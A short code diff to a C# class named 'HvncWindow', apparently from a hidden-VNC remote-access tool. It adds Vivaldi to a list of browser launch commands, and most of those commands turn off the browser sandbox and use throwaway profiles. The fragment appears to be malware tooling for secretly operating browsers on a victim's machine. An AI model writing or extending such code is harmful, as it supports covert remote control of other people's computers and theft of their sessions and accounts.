@@ -31,6 +31,7 @@ public partial class HvncWindow : Window
         ("Edge",      @"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe --no-sandbox --allow-no-sandbox-job --disable-gpu --start-maximized --user-data-dir=%TEMP%\hvnc_edge"),
         ("Firefox",   @"%ProgramFiles%\Mozilla Firefox\firefox.exe -profile %TEMP%\hvnc_ff -no-remote -width 1280 -height 720"),
         ("Brave",     @"%ProgramFiles%\BraveSoftware\Brave-Browser\Application\brave.exe --no-sandbox --allow-no-sandbox-job --disable-gpu --start-maximized --user-data-dir=%TEMP%\hvnc_brave"),
+        ("Vivaldi",   @"%LOCALAPPDATA%\Vivaldi\Application\vivaldi.exe --no-sandbox --allow-no-sandbox-job --disable-gpu --start-maximized"),
         ("Opera",     @"%LOCALAPPDATA%\Programs\Opera\opera.exe --no-sandbox --allow-no-sandbox-job --disable-gpu --start-maximized --no-first-run --user-data-dir=%TEMP%\hvnc_opera"),
         ("Opera GX",  @"%LOCALAPPDATA%\Programs\Opera GX\opera.exe --no-sandbox --allow-no-sandbox-job --disable-gpu --start-maximized --no-first-run --user-data-dir=%TEMP%\hvnc_operagx"),
         ("AyuGram",   @"%APPDATA%\AyuGram Desktop\AyuGram.exe"),
